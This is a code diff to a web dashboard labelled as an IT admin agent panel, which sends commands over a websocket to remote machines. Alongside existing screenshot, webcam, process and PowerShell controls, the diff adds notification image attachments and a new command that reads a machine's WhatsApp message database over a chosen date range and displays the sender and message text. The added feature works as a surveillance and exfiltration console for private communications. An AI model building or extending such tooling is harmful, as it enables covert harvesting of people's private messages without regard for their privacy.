@@ -769,6 +769,7 @@ import pdfjsWorkerUrl from "pdfjs-dist/build/pdf.worker.mjs?url";
   let itaMessages = [];
   let itaSenderName = localStorage.getItem("itaSenderName") || "YiDing IT Admin";
   let itaAvatarURL = localStorage.getItem("itaAvatarURL") || null;
+  let _itaNotifImgB64 = null;
   const ITA_VPS = "wss://agent.yidinginternational.com/dashboard";
 
   function itaEsc(s) {
@@ -886,7 +887,8 @@ import pdfjsWorkerUrl from "pdfjs-dist/build/pdf.worker.mjs?url";
     const on = itaSelected && itaMachines[itaSelected] && itaMachines[itaSelected].online;
     ["ita-btn-shot", "ita-btn-cam", "ita-btn-sys", "ita-btn-proc", "ita-btn-net",
      "ita-btn-notif", "ita-btn-ps", "ita-btn-list-pt", "ita-btn-queue",
-     "ita-btn-clr-q", "ita-btn-install-pt", "ita-btn-print-file"].forEach(id => {
+     "ita-btn-clr-q", "ita-btn-install-pt", "ita-btn-print-file",
+     "ita-btn-wa", "ita-btn-wa-date"].forEach(id => {
       const el = document.getElementById(id);
       if (el) el.disabled = !on;
     });
@@ -948,6 +950,7 @@ import pdfjsWorkerUrl from "pdfjs-dist/build/pdf.worker.mjs?url";
         else if (d.action === "get_processes") m.html = itaFmtProcesses(out);
         else if (d.action === "list_printers") m.html = itaFmtPrinters(out);
         else if (d.action === "get_print_queue") m.html = itaFmtPrintQueue(out);
+        else if (d.action === "read_whatsapp_db") m.html = itaFmtWhatsApp(out);
         else m.html = itaEsc(out || (isErr ? "(no output)" : "✓ OK"));
         itaRenderOutput();
         return;
@@ -962,6 +965,7 @@ import pdfjsWorkerUrl from "pdfjs-dist/build/pdf.worker.mjs?url";
     else if (d.action === "get_processes") html = itaFmtProcesses(out);
     else if (d.action === "list_printers") html = itaFmtPrinters(out);
     else if (d.action === "get_print_queue") html = itaFmtPrintQueue(out);
+    else if (d.action === "read_whatsapp_db") html = itaFmtWhatsApp(out);
     else html = itaEsc(out || (isErr ? "(no output)" : "✓ OK"));
 
     itaAddMsg(html, d.action || "result", d.device_id || "", isErr);
@@ -984,8 +988,36 @@ import pdfjsWorkerUrl from "pdfjs-dist/build/pdf.worker.mjs?url";
     const inp = document.getElementById("ita-notif-msg");
     const msg = inp ? inp.value.trim() : "";
     if (!msg) return;
-    itaSendCmd("send_notification", { title: itaSenderName, message: msg });
+    const params = { title: itaSenderName, message: msg };
+    if (_itaNotifImgB64) params.image = _itaNotifImgB64;
+    itaSendCmd("send_notification", params);
     if (inp) inp.value = "";
+    _itaNotifImgB64 = null;
+    const imgName = document.getElementById("ita-notif-img-name");
+    if (imgName) imgName.textContent = "";
+    const imgInp = document.getElementById("ita-notif-img-input");
+    if (imgInp) imgInp.value = "";
+    const attachBtn = document.getElementById("ita-btn-img-attach");
+    if (attachBtn) attachBtn.style.background = "";
+  }
+
+  function itaNotifImgChange(input) {
+    const file = input.files[0];
+    const attachBtn = document.getElementById("ita-btn-img-attach");
+    const imgName = document.getElementById("ita-notif-img-name");
+    if (!file) {
+      _itaNotifImgB64 = null;
+      if (imgName) imgName.textContent = "";
+      if (attachBtn) attachBtn.style.background = "";
+      return;
+    }
+    if (imgName) imgName.textContent = file.name;
+    const reader = new FileReader();
+    reader.onload = function(e) {
+      _itaNotifImgB64 = e.target.result.split(",")[1];
+      if (attachBtn) attachBtn.style.background = "#78350f";
+    };
+    reader.readAsDataURL(file);
   }
 
   function itaSendPS() {
@@ -1144,6 +1176,21 @@ import pdfjsWorkerUrl from "pdfjs-dist/build/pdf.worker.mjs?url";
       return [hdr, "─".repeat(58), ...rows].join("\n");
     } catch (ex) { return itaEsc(raw); }
   }
+  function itaFmtWhatsApp(raw) {
+    try {
+      const data = JSON.parse(raw);
+      if (data.error || data.status) return itaEsc(raw);
+      if (!Array.isArray(data) || !data.length) return "(Không có tin nhắn)";
+      const hdr = "Thời gian".padEnd(20) + " " + "Người gửi".padEnd(20) + " Tin nhắn";
+      const rows = data.map(m =>
+        (m.time || "").slice(0, 19).padEnd(20) + " " +
+        String(m.sender || "").slice(0, 20).padEnd(20) + " " +
+        String(m.message || "").slice(0, 80)
+      );
+      return [hdr, "─".repeat(80), ...rows].join("\n");
+    } catch (ex) { return itaEsc(raw); }
+  }
+
   // ─── End IT Agent Module ────────────────────────────────────────────────────
 
   renderAll();
@@ -1288,6 +1335,12 @@ import pdfjsWorkerUrl from "pdfjs-dist/build/pdf.worker.mjs?url";
         if (a === "toggle-printer") { itaTogglePrinter(); return; }
         if (a === "install-printer") { itaInstallPrinter(); return; }
         if (a === "print-file") { itaPrintFile(); return; }
+        if (a === "read-wa-date") {
+          const df = prompt("Từ ngày (YYYY-MM-DD):", new Date(Date.now()-7*86400000).toISOString().slice(0,10));
+          const dt = prompt("Đến ngày (YYYY-MM-DD):", new Date().toISOString().slice(0,10));
+          if (df !== null && dt !== null) itaSendCmd("read_whatsapp_db", { date_from: df, date_to: dt });
+          return;
+        }
         return;
       }
 
@@ -1680,9 +1733,15 @@ import pdfjsWorkerUrl from "pdfjs-dist/build/pdf.worker.mjs?url";
             </div>
             <div class="ita-tb-row">
               <input class="ita-input" id="ita-notif-msg" placeholder="Nội dung thông báo...">
+              <label class="ita-btn ita-btn--orange" id="ita-btn-img-attach" title="Đính kèm ảnh (hoặc Ctrl+V để dán)" style="cursor:pointer;font-size:16px;flex-shrink:0">🖼<input type="file" id="ita-notif-img-input" accept="image/*" style="display:none"></label>
+              <span id="ita-notif-img-name" style="font-size:11px;color:#a78bfa;max-width:70px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;flex-shrink:0"></span>
               <button class="ita-btn ita-btn--orange" id="ita-btn-notif" data-ita-action="send-notif"${_dis}>🔔 Gửi</button>
               <div class="ita-sep"></div>
               <button class="ita-btn ita-btn--muted" data-ita-action="send-notif-all">🔔 Tất cả</button>
+            </div>
+            <div class="ita-tb-row">
+              <button class="ita-btn ita-btn--purple" id="ita-btn-wa" data-ita-cmd="read_whatsapp_db"${_dis} style="flex:1">💬 WhatsApp</button>
+              <button class="ita-btn ita-btn--muted" id="ita-btn-wa-date" data-ita-action="read-wa-date"${_dis} style="flex:1">📅 WA + ngày</button>
             </div>
             <div class="ita-tb-row">
               <input class="ita-input ita-mono" id="ita-ps-cmd" placeholder="PowerShell command...">
@@ -1715,6 +1774,33 @@ import pdfjsWorkerUrl from "pdfjs-dist/build/pdf.worker.mjs?url";
       const psInp = document.getElementById("ita-ps-cmd");
       if (notifInp) notifInp.addEventListener("keydown", function(e) { if (e.isComposing || e.keyCode === 229) return; if (e.key === "Enter") itaSendNotif(); });
       if (psInp) psInp.addEventListener("keydown", function(e) { if (e.isComposing || e.keyCode === 229) return; if (e.key === "Enter") itaSendPS(); });
+
+      // File input change (chọn ảnh qua picker)
+      const imgInput = document.getElementById("ita-notif-img-input");
+      if (imgInput) imgInput.addEventListener("change", function() { itaNotifImgChange(this); });
+
+      // Paste ảnh từ clipboard (Ctrl+V) khi focus vào ô thông báo
+      if (notifInp) notifInp.addEventListener("paste", function(e) {
+        const items = e.clipboardData && e.clipboardData.items;
+        if (!items) return;
+        for (let i = 0; i < items.length; i++) {
+          if (items[i].type.startsWith("image/")) {
+            e.preventDefault();
+            const file = items[i].getAsFile();
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = function(ev) {
+              _itaNotifImgB64 = ev.target.result.split(",")[1];
+              const imgName = document.getElementById("ita-notif-img-name");
+              if (imgName) imgName.textContent = "📷 Ảnh đã dán";
+              const attachBtn = document.getElementById("ita-btn-img-attach");
+              if (attachBtn) attachBtn.style.background = "#78350f";
+            };
+            reader.readAsDataURL(file);
+            break;
+          }
+        }
+      });
 
       itaRenderOutput();
       itaApplyLang();
